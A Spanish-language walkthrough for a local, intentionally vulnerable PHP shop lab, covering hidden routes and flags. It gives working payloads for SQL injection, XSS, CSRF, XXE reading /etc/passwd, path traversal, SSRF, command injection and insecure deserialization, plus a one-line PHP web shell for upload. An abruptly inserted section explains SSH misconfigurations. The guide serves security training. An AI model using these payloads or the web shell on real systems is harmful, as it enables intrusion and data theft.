# Guia de Ataques - Web Vulnerable

Esta guia es para uso educativo en laboratorio local/autorizado. No ejecutes estas tecnicas contra sistemas de terceros sin permiso explicito.

La aplicacion publica parece una tienda normal, pero contiene rutas ocultas para practicar enumeracion, explotacion controlada y reporting.

## Entorno

Levantar solo la version vulnerable con Docker:

```bash
docker compose up --build app db
```

URL base:

```text
http://localhost:8000
```

Credenciales demo:

| Rol | Email | Password |
| --- | --- | --- |
| Admin | `admin@example.com` | `admin123` |
| Usuario | `user@example.com` | `user123` |

Si la base ya existia antes de agregar rutas/tablas nuevas:

```bash
docker compose down -v
docker compose up --build app db
```

## Rutas Visibles

| Ruta | Uso |
| --- | --- |
| `/index.php` | Tienda principal |
| `/search.php` | Buscador |
| `/product.php?id=1` | Producto y comentarios |
| `/cart.php` | Carrito |
| `/checkout.php` | Checkout |
| `/orders.php` | Pedidos |
| `/login.php` | Login |
| `/profile.php?id=1` | Perfil |
| `/admin.php` | Panel admin |

## Rutas Escondidas

| Ruta | Objetivo |
| --- | --- |
| `/debug.php` | Filtrar configuracion, usuarios, sesion y flag de recon |
| `/nodes.php` | Enumerar nodos internos |
| `/healthcheck.php` | Practicar SSRF-style URL injection |
| `/files.php` | Path traversal / directory traversal / LFI local |
| `/repo.php` | Leer notas/config filtradas |
| `/import_xml.php` | XXE |
| `/deserialize.php` | Insecure deserialization |
| `/rce.php` | Command injection local |
| `/logs.php` | Evidenciar logging insuficiente |
| `/guide.php` | Guia del laboratorio |
| `/hints.php` | Pistas progresivas |
| `/status.php` | Progreso de flags |
| `/submit_flag.php` | Envio de flags |
| `/api.php?resource=products` | API REST vulnerable |
| `/jwt.php` | JWT debil |
| `/redirect.php?to=/index.php` | Open redirect |
| `/template.php` | SSTI-like unsafe template eval |
| `/pollution.php?role=user&role=admin` | Parameter pollution |
| `/register.php` | Registro con mass assignment |
| `/forgot_password.php` | Enumeracion de usuarios y token predecible |
| `/reset_password.php` | Reset con token debil |
| `/change_password.php` | Cambio de password con user_id controlable |
| `/users.php` | CRUD usuarios sin autorizacion fuerte |
| `/categories.php` | CRUD categorias vulnerable |
| `/contact.php` | Stored XSS en mensajes |
| `/history.php` | IDOR de historial |
| `/reports.php` | Reportes con owner controlable |

## Reconocimiento Inicial

Comprobar servicio web:

```bash
curl -i http://localhost:8000/
```

Revisar `robots.txt`:

```bash
curl http://localhost:8000/robots.txt
```

Rutas interesantes reveladas:

```text
/debug.php
/backup/
/data/
```

Enumeracion manual recomendada:

```text
/admin.php
/debug.php
/nodes.php
/healthcheck.php
/files.php
/repo.php
/api.php?resource=products
```

## SQL Injection

### Login Bypass

Ruta:

```text
/login.php
```

Payload en email:

```text
admin@example.com' --
```

Payload alternativo:

```text
' OR '1'='1' --
```

Resultado esperado:

```text
Inicio de sesion sin conocer password real.
```

### UNION SQL Injection

Ruta:

```text
/search.php?q=test
```

Payload de prueba:

```text
' UNION SELECT id,email,password,0,'x',true FROM users --
```

Objetivo:

```text
Extraer usuarios/passwords desde una consulta de productos.
```

### Boolean SQL Injection

Ruta:

```text
/product.php?id=1
```

Payload verdadero:

```text
1 OR 1=1
```

Payload falso:

```text
1 AND 1=2
```

Compara diferencias de contenido.

### Time-Based SQL Injection

Ruta:

```text
/product.php?id=1
```

Payload PostgreSQL:

```text
1; SELECT pg_sleep(5)--
```

Si la respuesta tarda, hay ejecucion de SQL inyectado.

## Authentication Bypass y Broken Authentication

Rutas:

```text
/login.php
/forgot_password.php
/reset_password.php
/change_password.php
```

Pruebas:

- Login con SQLi.
- Passwords debiles: `admin123`, `user123`.
- Recuperacion con mensajes distintos para usuario valido/no valido.
- Token de reset predecible basado en email y fecha.
- Cambio de password con `user_id` controlado desde el formulario.

## Fuerza Bruta y Rate Limit Inexistente

Ruta:

```text
/login.php
```

Prueba manual:

```text
Intentar varios passwords para admin@example.com.
```

Resultado esperado:

```text
No hay bloqueo, captcha, demora progresiva ni alerta visible.
```

## Broken Access Control e IDOR

### Perfil de otro usuario

Requiere login.

```text
/profile.php?id=2
/profile.php?id=1
```

Objetivo:

```text
Leer datos de otro usuario cambiando el parametro id.
```

### Pedidos de otro usuario

```text
/orders.php?user_id=1
/orders.php?user_id=2
```

### Historial de otro usuario

```text
/history.php?user_id=1
/history.php?user_id=2
```

### CRUD usuarios sin autorizacion fuerte

```text
/users.php
```

Probar crear usuario con rol admin.

## Credenciales por Defecto y Weak Passwords

```text
admin@example.com:admin123
user@example.com:user123
```

Impacto:

```text
Acceso directo a cuentas privilegiadas o validacion de bypasses.
```

## XSS Reflected y Stored

### Reflected XSS

Ruta:

```text
/search.php?q=<script>alert(1)</script>
```

### Stored XSS en comentarios

Ruta:

```text
/product.php?id=1
```

Comentario:

```html
<script>alert('stored')</script>
```

### Stored XSS en contacto

Ruta:

```text
/contact.php
```

Mensaje:

```html
<img src=x onerror=alert('contact')>
```

## CSRF

Rutas sin token CSRF:

```text
/admin.php
/checkout.php
/change_password.php
/users.php
/categories.php
```

Ejemplo conceptual:

```html
<form action="http://localhost:8000/change_password.php" method="POST">
  <input name="user_id" value="2">
  <input name="password" value="newpass123">
</form>
<script>document.forms[0].submit()</script>
```

## File Upload Inseguro

Ruta:

```text
/admin.php?role=admin#upload
```

Archivo de prueba:

```php
<?php echo shell_exec($_GET['cmd'] ?? 'whoami'); ?>
```

Nombre sugerido:

```text
shell.php
```

Luego abrir:

```text
/uploads/shell.php?cmd=whoami
```

## Path Traversal, Directory Traversal y LFI

Ruta:

```text
/files.php?path=readme.txt
```

Payloads:

```text
/files.php?path=../backup/internal_nodes.txt
/files.php?path=../backup/gogs_config.bak
/files.php?path=../config.php
```

Objetivo:

```text
Leer archivos fuera del directorio permitido.
```

## RFI

La app no implementa inclusion remota PHP clasica. El punto mas cercano es el health check con URL controlada:

```text
/healthcheck.php
```

Usar como comparacion conceptual, no como RFI real.

## Command Injection / OS Command Injection

Ruta:

```text
/rce.php
```

Payloads:

```text
whoami
dir
type data\rce.txt
```

En Linux:

```text
whoami
ls -la
cat data/rce.txt
```

## SSTI

Ruta:

```text
/template.php
```

Payload:

```text
/template.php?template=Total:%20{{calc:7*7}}
```

Resultado esperado:

```text
Total: 49
```

## XXE

Ruta:

```text
/import_xml.php
```

Payload Linux:

```xml
<!DOCTYPE product [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<product><name>&xxe;</name></product>
```

Payload local del lab:

```xml
<!DOCTYPE product [ <!ENTITY xxe SYSTEM "file:///var/www/html/data/root.txt"> ]>
<product><name>&xxe;</name></product>
```

## SSRF

Ruta:

```text
/healthcheck.php
```

Targets simulados:

```text
http://files.internal/status.txt
http://git.internal/version.txt
http://backup.internal/internal_nodes.txt
```

Objetivo:

```text
Hacer que el servidor consulte recursos internos.
```

## JWT Inseguro

Ruta:

```text
/jwt.php
```

Generar token para:

```text
admin@example.com
```

Debilidad:

```text
Secreto debil: jwt-secret
Payload con role visible/modificable conceptualmente.
```

## Session Hijacking, Session Fixation y Cookies Inseguras

Revisar cookie:

```text
VULNSHOPSESSID
```

Aspectos a observar:

- No fuerza HTTPS.
- No se regenera sesion de forma robusta en todos los flujos.
- App vulnerable corre por HTTP en Docker.

## Informacion Sensible Expuesta

Rutas:

```text
/debug.php
/repo.php
/files.php?path=../backup/gogs_config.bak
```

Buscar:

- Password DB.
- Usuarios.
- Secretos.
- Rutas internas.

## Enumeracion de Usuarios

Ruta:

```text
/forgot_password.php
```

Comparar mensajes:

```text
admin@example.com
noexiste@example.com
```

## Error Handling Inseguro

`config.php` habilita errores:

```php
ini_set('display_errors', '1');
```

Provocar errores con parametros invalidos:

```text
/product.php?id='
/orders.php?user_id='
/api.php?resource=users&id='
```

## CORS Mal Configurado

Ruta:

```text
/api.php?resource=users
```

Cabeceras esperadas:

```text
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: *
```

## Clickjacking

La version vulnerable no envia `X-Frame-Options` ni CSP fuerte.

Prueba conceptual:

```html
<iframe src="http://localhost:8000/login.php"></iframe>
```

## Open Redirect

Ruta:

```text
/redirect.php?to=https://example.com
```

Resultado esperado:

```text
Redireccion a dominio externo sin validacion.
```

## Parameter Pollution

Ruta:

```text
/pollution.php?role=user&role=admin
```

Objetivo:

```text
Ver como parametros duplicados pueden alterar la logica efectiva.
```

## NoSQL Injection

No aplica directamente porque la app usa PostgreSQL. Documentar como no aplicable salvo que se agregue MongoDB u otro motor NoSQL.

## Mass Assignment

Ruta:

```text
/register.php
```

Campo sensible:

```text
role=admin
```

Tambien revisar:

```text
/users.php
```

## Insecure Deserialization

Ruta:

```text
/deserialize.php
```

Payload de ejemplo incluido en el formulario:

```text
O:10:"FileWriter":2:{s:4:"path";s:19:"uploads/pwned.txt";s:7:"content";s:17:"deserialized data";}
```

Resultado esperado:

```text
El objeto FileWriter se deserializa y su metodo __destruct() escribe uploads/pwned.txt con el contenido deserialized data.
```

Verificacion:

```text
http://localhost:8000/uploads/pwned.txt
```

Raiz del problema:

```text
La ruta recibe datos serializados controlados por el usuario y ejecuta unserialize() sin allowed_classes.
```

## Exposicion de Endpoints y API Insegura

Rutas:

```text
/api.php?resource=products
/api.php?resource=users
/api.php?resource=orders&user_id=1
```

Problemas:

- Sin autenticacion robusta.
- CORS abierto.
- SQL concatenado.
- Registro de payloads sin control real.

## Logging Inseguro

Ruta:

```text
/logs.php
```

Hallazgo:

```text
El sistema no registra correctamente intentos fallidos, bypasses admin ni manipulacion de checkout.
```

## Flags

Enviar flags:

```text
/submit_flag.php
```

API:

```bash
curl -X POST http://localhost:8000/api/submit-flag.php -d "flag=VSHOP{...}"
```

## Cadena Sugerida

1. Revisar `robots.txt`.
2. Abrir `/debug.php` y extraer informacion sensible.
3. Usar SQLi en `/login.php` o credenciales debiles.
4. Probar IDOR en `/profile.php?id=2` y `/orders.php?user_id=1`.
5. Acceder a `/admin.php?role=admin`.
6. Usar upload inseguro o `/rce.php` para probar ejecucion controlada.
7. Enumerar `/nodes.php`, `/healthcheck.php`, `/files.php`, `/repo.php`.
8. Leer backups con path traversal.
9. Probar API insegura, JWT debil, SSTI y open redirect.
10. Documentar impacto, evidencia y correccion.


Las vulnerabilidades en SSH casi nunca son “SSH está roto”. Normalmente el problema está en cómo lo configurás. SSH bien configurado es muy seguro; SSH mal configurado es una puerta abierta.
Vulnerabilidades comunes en SSH
1. Contraseñas débiles
Ejemplo:
usuario: vulnerable
contraseña: 123456
Si permitís login por contraseña y usás claves obvias, un atacante puede intentar adivinarlas.
2. Usuarios predecibles
Nombres como:
admin
root
test
user
vulnerable
facilitan ataques porque el atacante ya tiene medio camino hecho: solo necesita probar contraseñas.
3. Login de root habilitado
Si root puede entrar por SSH, el atacante no necesita escalar privilegios después. Si acierta la contraseña o clave, ya entra como administrador.
Configuración insegura:
PermitRootLogin yes
4. Autenticación por contraseña habilitada
No es “malo” siempre, pero es más riesgoso que usar llaves SSH.
Configuración más segura:
PasswordAuthentication no
5. Puerto expuesto públicamente
El puerto 22 abierto a internet recibe intentos constantes. No porque cambiar el puerto sea seguridad real, sino porque reduce ruido automatizado.
6. Versiones viejas de OpenSSH
Si el servidor SSH está desactualizado, puede tener fallas conocidas. Por eso se actualiza el sistema y el paquete openssh-server.
7. Permisos incorrectos en claves
Si una clave privada queda accesible para otros usuarios o se sube por error a GitHub, cualquiera que la tenga puede entrar.
8. Sin límites de intentos
Si no usás herramientas como fail2ban, rate limiting o reglas de firewall, un atacante puede intentar muchas combinaciones durante mucho tiempo.
En tu Docker vulnerable, la vulnerabilidad principal es esta:
useradd -m vulnerable
echo 'vulnerable:123456' | chpasswd
PasswordAuthentication yes
Eso crea un usuario conocido, con contraseña débil, y permite autenticación por contraseña. Para laboratorio está bien. Para producción, NO.
Una configuración más segura sería:
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
La idea clave: SSH no es vulnerable por existir en el puerto 22; se vuelve vulnerable cuando lo exponés con malas credenciales, mala configuración o software desactualizado.

## Checklist de Reporte

- [ ] Ruta afectada.
- [ ] Parametro vulnerable.
- [ ] Payload usado.
- [ ] Evidencia observada.
- [ ] Impacto real.
- [ ] Categoria OWASP 2025.
- [ ] Recomendacion de mitigacion.
